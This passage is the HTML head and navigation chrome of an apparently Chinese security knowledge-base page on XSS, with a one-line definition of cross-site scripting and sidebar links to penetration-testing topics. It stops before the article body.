<!doctype html>
<html lang="zh-CN" data-theme="light">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="generator" content="VuePress 2.0.0-rc.19" />
    <meta name="theme" content="VuePress Theme Hope 2.0.0-rc.67" />
    <style>
      :root {
        --vp-c-bg: #fff;
      }

      [data-theme="dark"] {
        --vp-c-bg: #1b1b1f;
      }

      html,
      body {
        background: var(--vp-c-bg);
      }
    </style>
    <script>
      const userMode = localStorage.getItem("vuepress-theme-hope-scheme");
      const systemDarkMode =
        window.matchMedia &&
        window.matchMedia("(prefers-color-scheme: dark)").matches;

      if (userMode === "dark" || (userMode !== "light" && systemDarkMode)) {
        document.documentElement.setAttribute("data-theme", "dark");
      }
    </script>
    <meta property="og:url" content="https://mister-hope.github.io/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%A4%96%E7%BD%91%E6%BC%8F%E6%B4%9E/XSS.html"><meta property="og:site_name" content="uu2fu3o的知识库"><meta property="og:title" content="XSS"><meta property="og:description" content="2.XSS(跨站脚本攻击) 2.1 XSS简介 （英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。 XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入..."><meta property="og:type" content="article"><meta property="og:locale" content="zh-CN"><meta property="og:updated_time" content="2025-01-15T18:41:02.000Z"><meta property="article:published_time" content="2023-09-03T07:29:52.000Z"><meta property="article:modified_time" content="2025-01-15T18:41:02.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"XSS","image":[""],"datePublished":"2023-09-03T07:29:52.000Z","dateModified":"2025-01-15T18:41:02.000Z","author":[{"@type":"Person","name":"uu2fu3o","url":"https://mister-hope.com"}]}</script><meta name="referer" content="no-referer"><title>XSS | uu2fu3o的知识库</title><meta name="description" content="2.XSS(跨站脚本攻击) 2.1 XSS简介 （英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。 XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入...">
    <link rel="preload" href="/articles/assets/style-SIpkR8pu.css" as="style"><link rel="stylesheet" href="/articles/assets/style-SIpkR8pu.css">
    <link rel="modulepreload" href="/articles/assets/app-DS0ZCcmM.js"><link rel="modulepreload" href="/articles/assets/XSS.html-BywsLibZ.js"><link rel="modulepreload" href="/articles/assets/plugin-vue_export-helper-DlAUqK2U.js">
    <link rel="prefetch" href="/articles/assets/index.html-Bg7DAMOU.js" as="script"><link rel="prefetch" href="/articles/assets/Bypass.html-CQtJKDr4.js" as="script"><link rel="prefetch" href="/articles/assets/Fastjson不出网简单利用.html-CUh5hqJ4.js" as="script"><link rel="prefetch" href="/articles/assets/Fastjson与原生反序列化.html-ETvzwkxT.js" as="script"><link rel="prefetch" href="/articles/assets/基础利用链.html-Bi_F-aRy.js" as="script"><link rel="prefetch" href="/articles/assets/探测与判断.html-Dfic0kpM.js" as="script"><link rel="prefetch" href="/articles/assets/简单使用.html-_VS8kRg8.js" as="script"><link rel="prefetch" href="/articles/assets/Hessian反序列化.html-5ABeI925.js" as="script"><link rel="prefetch" href="/articles/assets/简介.html-DgUNlQgn.js" as="script"><link rel="prefetch" href="/articles/assets/ClassLoader.html-jaBmEacR.js" as="script"><link rel="prefetch" href="/articles/assets/Java_Agent.html-D95Lx0Zn.js" as="script"><link rel="prefetch" href="/articles/assets/Java文件系统.html-DNGfcXUY.js" as="script"><link rel="prefetch" href="/articles/assets/JDBC.html-CyOguz2c.js" as="script"><link rel="prefetch" href="/articles/assets/JNDI.html-DEp66arw.js" as="script"><link rel="prefetch" href="/articles/assets/RMI.html-2OkUSrfd.js" as="script"><link rel="prefetch" href="/articles/assets/动态代理.html-BrhiXGp_.js" as="script"><link rel="prefetch" href="/articles/assets/反射.html-DJnN2u7I.js" as="script"><link rel="prefetch" href="/articles/assets/本地命令执行.html-BZJ1jxoU.js" as="script"><link rel="prefetch" href="/articles/assets/类序列化.html-V1-awgoa.js" as="script"><link rel="prefetch" href="/articles/assets/一文速通.html-LviL43_4.js" as="script"><link rel="prefetch" href="/articles/assets/550.html-CPpQBphD.js" as="script"><link rel="prefetch" href="/articles/assets/721.html-DPRUhjIK.js" as="script"><link rel="prefetch" href="/articles/assets/简单介绍.html-CrJxuJI2.js" as="script"><link rel="prefetch" href="/articles/assets/Servlet.html-BsUacsfD.js" as="script"><link rel="prefetch" href="/articles/assets/SpEL表达式注入.html-BHTvp0bA.js" as="script"><link rel="prefetch" href="/articles/assets/Spring基础.html-DWZ1eGrz.js" as="script"><link rel="prefetch" href="/articles/assets/Rome反序列化.html-DtfvWMl5.js" as="script"><link rel="prefetch" href="/articles/assets/Trace.html-CCtiB5PM.js" as="script"><link rel="prefetch" href="/articles/assets/认识Devops.html-Cw5MjBZS.js" as="script"><link rel="prefetch" href="/articles/assets/Docker使用.html-gXoXqPcq.js" as="script"><link rel="prefetch" href="/articles/assets/Docker漏洞汇总.html-USwKDYxu.js" as="script"><link rel="prefetch" href="/articles/assets/Docker的基本概念.html-C1hJ0LK3.js" as="script"><link rel="prefetch" href="/articles/assets/Docker的底层实现.html-fEQF-vnY.js" as="script"><link rel="prefetch" href="/articles/assets/Docker网络.html-BKD3QDtG.js" as="script"><link rel="prefetch" href="/articles/assets/K8s入门.html-3bXdZGKB.js" as="script"><link rel="prefetch" href="/articles/assets/k8s漏洞.html-COsmps1_.js" as="script"><link rel="prefetch" href="/articles/assets/K8s进阶.html-Bgvvfxgp.js" as="script"><link rel="prefetch" href="/articles/assets/kubectl备忘录.html-BNwoFHMA.js" as="script"><link rel="prefetch" href="/articles/assets/认识K8s.html-DgZSgoNG.js" as="script"><link rel="prefetch" href="/articles/assets/pandas.html-BPTRF8nv.js" as="script"><link rel="prefetch" href="/articles/assets/数据可视化seaborn.html-CdUcLU4P.js" as="script"><link rel="prefetch" href="/articles/assets/Feature-Engineering.html-vwst1Ea4.js" as="script"><link rel="prefetch" href="/articles/assets/机器学习简介.html-DiG0diJF.js" as="script"><link rel="prefetch" href="/articles/assets/机器学习进阶.html-2UyQakVn.js" as="script"><link rel="prefetch" href="/articles/assets/2021美亚杯个人赛.html-t9ogmCBO.js" as="script"><link rel="prefetch" href="/articles/assets/取证基础.html-BjaU1VQg.js" as="script"><link rel="prefetch" href="/articles/assets/AD_CS基础.html-DQZKJlcP.js" as="script"><link rel="prefetch" href="/articles/assets/AD_CS漏洞利用.html-BAePwNBL.js" as="script"><link rel="prefetch" href="/articles/assets/exchane快速了解.html-CnJ14dA9.js" as="script"><link rel="prefetch" href="/articles/assets/exchane攻击手法.html-DgatBQvl.js" as="script"><link rel="prefetch" href="/articles/assets/AS_REQ_AS_REP阶段攻击.html-Dvd7rnFh.js" as="script"><link rel="prefetch" href="/articles/assets/Kerberos认证基础.html-vjDwbWv_.js" as="script"><link rel="prefetch" href="/articles/assets/PAC.html-CVa0PtNi.js" as="script"><link rel="prefetch" href="/articles/assets/Pass-the-ticket.html-CaA_y0GZ.js" as="script"><link rel="prefetch" href="/articles/assets/TGS_REQ_TGS_REP阶段攻击.html-B_ey6NSw.js" as="script"><link rel="prefetch" href="/articles/assets/TGS_REQ_TGS_REP阶段详解.html-vrtIAyOs.js" as="script"><link rel="prefetch" href="/articles/assets/委派攻击专题.html-C_eJ-6Jh.js" as="script"><link rel="prefetch" href="/articles/assets/Active-Directory简介.html-CVdh-iaa.js" as="script"><link rel="prefetch" href="/articles/assets/域权限.html-SUvF-mRS.js" as="script"><link rel="prefetch" href="/articles/assets/域用户和计算机用户.html-vKm6T84-.js" as="script"><link rel="prefetch" href="/articles/assets/特权与危险ACL.html-C5riArvo.js" as="script"><link rel="prefetch" href="/articles/assets/组和OU介绍.html-B6uWgahB.js" as="script"><link rel="prefetch" href="/articles/assets/组策略.html-CtKG8IG-.js" as="script"><link rel="prefetch" href="/articles/assets/组策略的一些利用.html-Ddbu1Nzw.js" as="script"><link rel="prefetch" href="/articles/assets/NET-NTLM-hash破解.html-DG9Mlvoq.js" as="script"><link rel="prefetch" href="/articles/assets/NTLM-Relay.html-BHiAPTko.js" as="script"><link rel="prefetch" href="/articles/assets/NTLM基础.html-DmMVTJbJ.js" as="script"><link rel="prefetch" href="/articles/assets/NTLM签名.html-vx223D2R.js" as="script"><link rel="prefetch" href="/articles/assets/发送NTLM请求.html-Cqw3Zhqf.js" as="script"><link rel="prefetch" href="/articles/assets/相关漏洞.html-D7ixi6Nr.js" as="script"><link rel="prefetch" href="/articles/assets/IPC连接与默认共享的盘符文件有什么区别.html-3VOetEg3.js" as="script"><link rel="prefetch" href="/articles/assets/Potato家族提权.html-DhfQgdpt.js" as="script"><link rel="prefetch" href="/articles/assets/Psexec过程分析与监测.html-FSnMDOba.js" as="script"><link rel="prefetch" href="/articles/assets/windows权限提升.html-CMAt1ZkH.js" as="script"><link rel="prefetch" href="/articles/assets/内网信息收集.html-BJPG-emp.js" as="script"><link rel="prefetch" href="/articles/assets/内网权限持久化.html-DayL8Gbv.js" as="script"><link rel="prefetch" href="/articles/assets/内网横向移动.html-CrAXpM4c.js" as="script"><link rel="prefetch" href="/articles/assets/内网渗透基础知识.html-n-SWeZk7.js" as="script"><link rel="prefetch" href="/articles/assets/哈希传递攻击(PTH).html-Dl6dq95b.js" as="script"><link rel="prefetch" href="/articles/assets/端口转发与代理.html-B7x_COFm.js" as="script"><link rel="prefetch" href="/articles/assets/CSRF.html-SW8WjNql.js" as="script"><link rel="prefetch" href="/articles/assets/JWT.html-CoubRWEl.js" as="script"><link rel="prefetch" href="/articles/assets/Redis未授权漏洞.html-Db5SaDgu.js" as="script"><link rel="prefetch" href="/articles/assets/SQL.html-BURorKVT.js" as="script"><link rel="prefetch" href="/articles/assets/Ssrf.html-CWZ0XFeE.js" as="script"><link rel="prefetch" href="/articles/assets/Upload Insecure Files.html-OEKVSr4H.js" as="script"><link rel="prefetch" href="/articles/assets/XML.html-D81EjJV9.js" as="script"><link rel="prefetch" href="/articles/assets/IP_parsing.html-ChXR7DKl.js" as="script"><link rel="prefetch" href="/articles/assets/反弹shell原理及分析.html-VxxYGMth.js" as="script"><link rel="prefetch" href="/articles/assets/系统提权.html-Dnwq9oYx.js" as="script"><link rel="prefetch" href="/articles/assets/Java_Agent.html--MtoXd4y.js" as="script"><link rel="prefetch" href="/articles/assets/controller.html-YOoG0l9l.js" as="script"><link rel="prefetch" href="/articles/assets/Interceptor.html-BVFrKjZJ.js" as="script"><link rel="prefetch" href="/articles/assets/Adapter.html-5mPE_dIf.js" as="script"><link rel="prefetch" href="/articles/assets/Executor.html-Dw9awOBY.js" as="script"><link rel="prefetch" href="/articles/assets/Filter.html-8ioPDzQ8.js" as="script"><link rel="prefetch" href="/articles/assets/Listener.html-CYtvfuL4.js" as="script"><link rel="prefetch" href="/articles/assets/Servlet.html-oQm3R21R.js" as="script"><link rel="prefetch" href="/articles/assets/Tomcat架构.html-B0sLghq3.js" as="script"><link rel="prefetch" href="/articles/assets/Upgrade.html-DoMCg3KM.js" as="script"><link rel="prefetch" href="/articles/assets/Valve.html-DCOpjMG0.js" as="script"><link rel="prefetch" href="/articles/assets/反序列化注入内存马.html-Dp-LsK9a.js" as="script"><link rel="prefetch" href="/articles/assets/BeanFactory.html-DXnkVHCX.js" as="script"><link rel="prefetch" href="/articles/assets/Hex_Base.html-iITwRDnM.js" as="script"><link rel="prefetch" href="/articles/assets/JNDI.html-CKcVi2kl.js" as="script"><link rel="prefetch" href="/articles/assets/URLClassLoader.html-Cz9H6yyf.js" as="script"><link rel="prefetch" href="/articles/assets/CC1.html-7mC5_162.js" as="script"><link rel="prefetch" href="/articles/assets/CC2.html-IFIXtfHE.js" as="script"><link rel="prefetch" href="/articles/assets/CC3.html-DrN-8dox.js" as="script"><link rel="prefetch" href="/articles/assets/CC4.html-ByOohAJX.js" as="script"><link rel="prefetch" href="/articles/assets/CC5.html-EEg6PPsv.js" as="script"><link rel="prefetch" href="/articles/assets/CC6.html-DSvs0P_-.js" as="script"><link rel="prefetch" href="/articles/assets/CC7.html-B1Xjoqea.js" as="script"><link rel="prefetch" href="/articles/assets/Transformer.html-BbVh1LO3.js" as="script"><link rel="prefetch" href="/articles/assets/Mysql.html-BHg-SMS1.js" as="script"><link rel="prefetch" href="/articles/assets/入门尝试篇.html-NDiS16HB.js" as="script"><link rel="prefetch" href="/articles/assets/基本使用.html-DGH4eqLl.js" as="script"><link rel="prefetch" href="/articles/assets/404.html-Cgf62U0R.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-4j5fwV-g.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-DULVbgdv.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-JMmAk-KG.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-CwLVL-C4.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-BozBz9zP.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-PDcLWHOa.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-HnbH_qyP.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-BSbWn9Xu.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-Bw7Eq_XS.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-CDLzLQY2.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-ftI39xYm.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-OsqxZBAb.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-mCyhugr0.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-h5i1SGSo.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-972XI028.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-Oj-4OZD3.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-PtXuC15D.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-CzMbZgKK.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-CCqAf6Be.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-hFcmh7VQ.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-DJkWSLr7.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-BYvqEtJh.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-BbfDgHC8.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-C5aovznj.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-B0Wvhw4A.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-Bj6Di-tA.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-DAHjRtBA.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-eQoNKRDh.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-KUSRtHsB.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-BoBMchNc.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-Bhj74XaZ.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-DNSfl9hN.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-BBsv_skI.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-Xh08z9Zh.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-Bvg1WPTd.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-CfVmIg04.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-DItOmTtO.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-Dkh6NMpw.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-CtH95Ffy.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-anzHPGNX.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-DUXCKHrX.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-162FtOoG.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-DDfe71zk.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-7iECCkbv.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-tb9HmGpj.js" as="script"><link rel="prefetch" href="/articles/assets/index.html-BdHsakpq.js" as="script"><link rel="prefetch" href="/articles/assets/photoswipe.esm-CMg0yb1C.js" as="script"><link rel="prefetch" href="/articles/assets/setupDevtools-7MC2TMWH-BFND-3Ff.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">跳至主要內容</a><!--]--><div class="theme-container external-link-icon has-toc" vp-container><!--[--><header id="navbar" class="vp-navbar" vp-navbar><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><a class="route-link vp-brand" href="/articles/" aria-label="带我回家"><img class="vp-nav-logo" src="https://theme-hope-assets.vuejs.press/logo.svg" alt><!----><span class="vp-site-name hide-in-pad">uu2fu3o的知识库</span></a><!--]--></div><div class="vp-navbar-center"><!--[--><!----><!--]--></div><div class="vp-navbar-end"><!--[--><!----><div class="vp-nav-item vp-action"><a class="vp-action-link" href="https://github.com/vuepress-theme-hope/vuepress-theme-hope" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="icon github-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="github icon" name="github" style="width:1.25rem;height:1.25rem;vertical-align:middle;"><path d="M511.957 21.333C241.024 21.333 21.333 240.981 21.333 512c0 216.832 140.544 400.725 335.574 465.664 24.49 4.395 32.256-10.07 32.256-23.083 0-11.69.256-44.245 0-85.205-136.448 29.61-164.736-64.64-164.736-64.64-22.315-56.704-54.4-71.765-54.4-71.765-44.587-30.464 3.285-29.824 3.285-29.824 49.195 3.413 75.179 50.517 75.179 50.517 43.776 75.008 114.816 53.333 142.762 40.79 4.523-31.66 17.152-53.377 31.19-65.537-108.971-12.458-223.488-54.485-223.488-242.602 0-53.547 19.114-97.323 50.517-131.67-5.035-12.33-21.93-62.293 4.779-129.834 0 0 41.258-13.184 134.912 50.346a469.803 469.803 0 0 1 122.88-16.554c41.642.213 83.626 5.632 122.88 16.554 93.653-63.488 134.784-50.346 134.784-50.346 26.752 67.541 9.898 117.504 4.864 129.834 31.402 34.347 50.474 78.123 50.474 131.67 0 188.586-114.73 230.016-224.042 242.09 17.578 15.232 33.578 44.672 33.578 90.454v135.85c0 13.142 7.936 27.606 32.854 22.87C862.25 912.597 1002.667 728.747 1002.667 512c0-271.019-219.648-490.667-490.71-490.667z"></path></svg></a></div><div class="vp-nav-item hide-in-mobile"><button type="button" class="vp-color-mode-switch" id="color-mode-switch"><svg xmlns="http://www.w3.org/2000/svg" class="icon auto-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="auto icon" name="auto" style="display:block;"><path d="M512 992C246.92 992 32 777.08 32 512S246.92 32 512 32s480 214.92 480 480-214.92 480-480 480zm0-840c-198.78 0-360 161.22-360 360 0 198.84 161.22 360 360 360s360-161.16 360-360c0-198.78-161.22-360-360-360zm0 660V212c165.72 0 300 134.34 300 300 0 165.72-134.28 300-300 300z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon dark-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="dark icon" name="dark" style="display:none;"><path d="M524.8 938.667h-4.267a439.893 439.893 0 0 1-313.173-134.4 446.293 446.293 0 0 1-11.093-597.334A432.213 432.213 0 0 1 366.933 90.027a42.667 42.667 0 0 1 45.227 9.386 42.667 42.667 0 0 1 10.24 42.667 358.4 358.4 0 0 0 82.773 375.893 361.387 361.387 0 0 0 376.747 82.774 42.667 42.667 0 0 1 54.187 55.04 433.493 433.493 0 0 1-99.84 154.88 438.613 438.613 0 0 1-311.467 128z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon light-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="light icon" name="light" style="display:none;"><path d="M952 552h-80a40 40 0 0 1 0-80h80a40 40 0 0 1 0 80zM801.88 280.08a41 41 0 0 1-57.96-57.96l57.96-58a41.04 41.04 0 0 1 58 58l-58 57.96zM512 752a240 240 0 1 1 0-480 240 240 0 0 1 0 480zm0-560a40 40 0 0 1-40-40V72a40 40 0 0 1 80 0v80a40 40 0 0 1-40 40zm-289.88 88.08-58-57.96a41.04 41.04 0 0 1 58-58l57.96 58a41 41 0 0 1-57.96 57.96zM192 512a40 40 0 0 1-40 40H72a40 40 0 0 1 0-80h80a40 40 0 0 1 40 40zm30.12 231.92a41 41 0 0 1 57.96 57.96l-57.96 58a41.04 41.04 0 0 1-58-58l58-57.96zM512 832a40 40 0 0 1 40 40v80a40 40 0 0 1-80 0v-80a40 40 0 0 1 40-40zm289.88-88.08 58 57.96a41.04 41.04 0 0 1-58 58l-57.96-58a41 41 0 0 1 57.96-57.96z"></path></svg></button></div><!----><!--]--><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside id="sidebar" class="vp-sidebar" vp-sidebar><!----><ul class="vp-sidebar-links"><li><a class="route-link auto-link vp-sidebar-link" href="/articles/" aria-label="Home"><!--[--><i class="vp-icon fas fa-home" style=""></i><!--]-->Home<!----></a></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable active" type="button"><!----><span class="vp-sidebar-title">渗透测试</span><span class="vp-arrow down"></span></button><ul class="vp-sidebar-links"><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">技术原理与分析</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">内网体系建设</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable active" type="button"><!----><span class="vp-sidebar-title">外网漏洞</span><span class="vp-arrow down"></span></button><ul class="vp-sidebar-links"><li><a class="route-link auto-link vp-sidebar-link" href="/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%A4%96%E7%BD%91%E6%BC%8F%E6%B4%9E/CSRF.html" aria-label="CSRF"><!---->CSRF<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%A4%96%E7%BD%91%E6%BC%8F%E6%B4%9E/JWT.html" aria-label="JWT"><!---->JWT<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%A4%96%E7%BD%91%E6%BC%8F%E6%B4%9E/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E.html" aria-label="Redis未授权漏洞"><!---->Redis未授权漏洞<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%A4%96%E7%BD%91%E6%BC%8F%E6%B4%9E/SQL.html" aria-label="SQL"><!---->SQL<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%A4%96%E7%BD%91%E6%BC%8F%E6%B4%9E/Ssrf.html" aria-label="Ssrf"><!---->Ssrf<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%A4%96%E7%BD%91%E6%BC%8F%E6%B4%9E/Upload%20Insecure%20Files.html" aria-label="Upload Insecure Files"><!---->Upload Insecure Files<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%A4%96%E7%BD%91%E6%BC%8F%E6%B4%9E/XML.html" aria-label="XML"><!---->XML<!----></a></li><li><a class="route-link route-link-active auto-link vp-sidebar-link active" href="/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%A4%96%E7%BD%91%E6%BC%8F%E6%B4%9E/XSS.html" aria-label="XSS"><!---->XSS<!----></a></li></ul></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">AD CS专题</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">Exchange专题</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">Kerberos专题</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">LDAP专题</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">NTLM专题</span><span class="vp-arrow end"></span></button><!----></section></li></ul></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">Java学习</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">Reverse</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">人工智能</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><!----><span class="vp-sidebar-title">小技能</span><span class="vp-arrow end"></span></button><!----></section></li></ul><!----></aside><!--[--><main id="main-content" class="vp-page"><!--[--><!----><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><!---->XSS</h1><div class="page-info"><span class="page-author-info" aria-label="作者🖊" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon author-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="author icon" name="author"><path d="M649.6 633.6c86.4-48 147.2-144 147.2-249.6 0-160-128-288-288-288s-288 128-288 288c0 108.8 57.6 201.6 147.2 249.6-121.6 48-214.4 153.6-240 288-3.2 9.6 0 19.2 6.4 25.6 3.2 9.6 12.8 12.8 22.4 12.8h704c9.6 0 19.2-3.2 25.6-12.8 6.4-6.4 9.6-16 6.4-25.6-25.6-134.4-121.6-240-243.2-288z"></path></svg><span><a class="page-author-item" href="https://mister-hope.com" target="_blank" rel="noopener noreferrer">uu2fu3o</a></span><span property="author" content="uu2fu3o"></span></span><!----><span class="page-date-info" aria-label="写作日期📅" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="calendar icon" name="calendar"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 01-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 01-33.473-33.473V143.657H180.6A134.314 134.314 0 0046.66 277.595v535.756A134.314 134.314 0 00180.6 947.289h669.74a134.36 134.36 0 00133.94-133.938V277.595a134.314 134.314 0 00-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 01-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 01-33.472 33.473z"></path></svg><span data-allow-mismatch="text">2023年9月3日</span><meta property="datePublished" content="2023-09-03T07:29:52.000Z"></span><!----><span class="page-reading-time-info" aria-label="阅读时间⌛" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon" name="timer"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>大约 36 分钟</span><meta property="timeRequired" content="PT36M"></span><span class="page-category-info" aria-label="分类🌈" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon category-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="category icon" name="category"><path d="M148.41 106.992h282.176c22.263 0 40.31 18.048 40.31 40.31V429.48c0 22.263-18.047 40.31-40.31 40.31H148.41c-22.263 